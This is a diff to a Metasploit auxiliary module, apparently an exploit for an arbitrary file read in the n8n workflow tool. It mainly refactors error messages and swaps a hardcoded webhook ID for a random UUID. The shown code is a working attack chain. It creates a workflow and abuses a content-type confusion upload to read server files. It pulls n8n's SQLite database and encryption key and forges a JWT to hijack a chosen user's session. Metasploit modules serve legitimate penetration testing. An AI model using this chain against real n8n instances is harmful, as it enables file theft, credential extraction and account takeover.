@@ -7,14 +7,13 @@ require 'sqlite3'
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
-  include Msf::Exploit::Remote::HTTP::JWT
 
   def initialize(info = {})
     super(
       update_info(
         info,
         'Name' => 'n8n arbitrary file read',
-        'Description' => 'TODO',
+        'Description' => '#TODO',
         'Author' => [
           'dor attias', # research
           'msutovsky-r7' # module
@@ -95,7 +94,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def create_file_upload_workflow
     @workflow_name = "workflow_#{Rex::Text.rand_text_alphanumeric(8)}"
-
+    random_uuid = SecureRandom.uuid.strip
     workflow_data = {
       'name' => @workflow_name,
       'active' => false,
@@ -124,7 +123,7 @@ class MetasploitModule < Msf::Auxiliary
           position: [0, 0],
           id: 'e4f12efa-9975-4041-b71f-0ce4999ec5a7',
           name: 'On form submission',
-          webhookId: '594fbf70-b077-41e0-89b6-b9dc856cd370'
+          webhookId: random_uuid
         }
       ],
       'connections' => {},
@@ -149,7 +148,7 @@ class MetasploitModule < Msf::Auxiliary
     version_id = json.dig('data', 'versionId')
     id = json.dig('data', 'id')
 
-    fail_with(Failure::UnexpectedReply, 'Failed to get workflow ID from response') unless @workflow_id && nodes && version_id && id
+    fail_with(Failure::NotFound, 'Failed to get workflow ID from response') unless @workflow_id && nodes && version_id && id
 
     activation_data = {
       'workflowData' => {
@@ -186,15 +185,15 @@ class MetasploitModule < Msf::Auxiliary
       'data' => activation_data.to_json
     )
 
-    fail_with(Failure::PayloadFailed, 'Failed to run file upload') unless res&.code == 200
+    fail_with(Failure::UnexpectedReply, 'Workflow may not run, received unexpected reply') unless res&.code == 200
 
     json_data = res.get_json_document
 
-    fail_with(Failure::PayloadFailed, 'Failed to run file upload') unless json_data.dig('data', 'waitingForWebhook') == true
-    '594fbf70-b077-41e0-89b6-b9dc856cd370'
+    fail_with(Failure::PayloadFailed, 'Failed to run workflow') unless json_data.dig('data', 'waitingForWebhook') == true
+    random_uuid
   end
 
-  def get_execution_id
+  def get_run_id
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri('rest', 'executions'),
@@ -204,12 +203,12 @@ class MetasploitModule < Msf::Auxiliary
         'limit' => 10
       }
     })
-    fail_with(Failure::PayloadFailed, '') unless res&.code == 200
+    fail_with(Failure::UnexpectedReply, 'Received unexpected reply, could not get run ID') unless res&.code == 200
 
     json_data = res.get_json_document
 
     run_id = json_data.dig('data', 'results', 0, 'id')
-    fail_with(Failure::PayloadFailed, '') unless run_id
+    fail_with(Failure::Unknown, 'Failed to get run ID, workflow might not run') unless run_id
 
     run_id
   end
@@ -253,19 +252,19 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => normalize_uri('rest', 'executions', run_id)
     })
 
-    fail_with(Failure::PayloadFailed, '') unless res&.code == 200
+    fail_with(Failure::UnexpectedReply, 'Failed to get information about execution, received unexpected reply') unless res&.code == 200
 
     json_data = res.get_json_document
 
     file_data = json_data.dig('data', 'data')
 
-    fail_with(Failure::PayloadFailed, '') unless file_data
+    fail_with(Failure::PayloadFailed, 'Failed to read the file') unless file_data
 
     parsed_file_data = JSON.parse(file_data)
 
     file_content_enc = parsed_file_data[29]
 
-    fail_with(Failure::PayloadFailed, '') unless file_content_enc
+    fail_with(Failure::NotFound, 'File not found') unless file_content_enc
 
     file_content = ::Base64.decode64(file_content_enc)
 
@@ -277,7 +276,7 @@ class MetasploitModule < Msf::Auxiliary
 
     content_type_confusion_upload(form_uri, filename)
 
-    run_id = get_execution_id
+    run_id = get_run_id
 
     file_content = extract_content(run_id)
 
@@ -302,7 +301,7 @@ class MetasploitModule < Msf::Auxiliary
     case action.name
     when 'READ_FILE'
       target_filename = datastore['TARGET_FILENAME']
-      fail_with(Failure::BadConfig, '') if target_filename.blank?
+      fail_with(Failure::BadConfig, 'Filename needs to be set') if target_filename.blank?
       file_content = read_file(target_filename)
 
       stored_path = store_loot(target_filename, 'text/plain', datastore['rhosts'], file_content)
@@ -311,7 +310,7 @@ class MetasploitModule < Msf::Auxiliary
     when 'EXTRACT_SESSION'
       target_username = datastore['SPOOFED_EMAIL']
 
-      fail_with(Failure::BadConfig, '') if target_username.blank?
+      fail_with(Failure::BadConfig, 'Spoofed email needs to be set') if target_username.blank?
 
       db_content = read_file('/home/node/.n8n/database.sqlite')
 
@@ -332,7 +331,7 @@ class MetasploitModule < Msf::Auxiliary
       encryption_key = config_content_json['encryptionKey']
 
       print_good("Extracted encryption key: #{encryption_key}")
-      jwt_payload = { id: user_id, hash: Digest::SHA256.digest("#{target_username}#{password_hash}") }
+      jwt_payload = { 'id' => user_id, 'hash' => Digest::SHA256.digest("#{target_username}#{password_hash}") }
       jwt_ticket = Msf::Exploit::Remote::HTTP::JWT.encode(jwt_payload.to_s, encryption_key)
 
       print_good("JWT ticket as #{target_username}: #{jwt_ticket}")
